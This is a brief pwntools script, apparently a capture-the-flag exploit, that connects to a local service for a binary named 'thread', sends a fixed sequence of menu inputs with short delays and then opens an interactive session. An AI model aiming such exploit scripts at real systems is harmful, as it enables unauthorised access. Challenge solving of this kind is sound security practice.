from pwn import *
import time
context.log_level = 'debug'
# io = process("./thread")
io = remote('0.0.0.0', 10001)
ss = '213121212121111120'
# ss = '2131111111111120'
payload = ""
for s in ss:
    io.sendline(s)
    time.sleep(0.5)
io.interactive()